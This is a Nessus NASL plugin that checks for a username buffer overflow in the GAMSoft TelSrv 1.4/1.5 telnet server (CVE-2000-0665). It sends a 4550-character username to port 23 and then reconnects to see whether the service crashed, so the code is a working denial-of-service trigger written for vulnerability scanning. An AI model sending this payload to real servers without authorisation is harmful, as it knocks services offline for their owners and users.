#
# This script was written by Prizm <Prizm@RESENTMENT.org>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - description changed somehow [RD]
# - handles the fact that the shareware may not be registered [RD]
# - revised plugin title (6/16/09)
# - changed family (6/28/09)

include("compat.inc");

if(description) {
    script_id(10474);
    script_version ("$Revision: 1.20 $");
    script_cve_id("CVE-2000-0665");
    script_bugtraq_id(1478);
    script_xref(name:"OSVDB", value:"373");

    script_name(english:"GAMSoft TelSrv 1.4/1.5 Username Overflow DoS");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote telnet server has a buffer overflow vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"It is possible to crash the remote telnet server by sending a
username that is 4550 characters or longer.  A remote attacker could
exploit this to crash the service, or potentially execute arbitrary
code."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0031.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"There is no known solution at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

    script_summary(english:"Crash GAMSoft TelSrv telnet server.");
    script_category(ACT_DENIAL);
    script_copyright(english:"This script is Copyright (C) 2000-2009 Prizm <Prizm@RESENTMENT.org");
    script_family(english:"Windows");
    script_dependencie("find_service1.nasl");
    script_require_ports("Services/telnet", 23);
    exit(0);
}
include("global_settings.inc");
include('telnet_func.inc');

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  r = recv(socket:soc, length:8192);
  if("5 second delay" >< r)sleep(5);
  r = recv(socket:soc, length:8192);
  req = string(crap(4550), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else {
        r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
        close(soc2);
        if(!r)security_hole(port);
      }
  }  
}

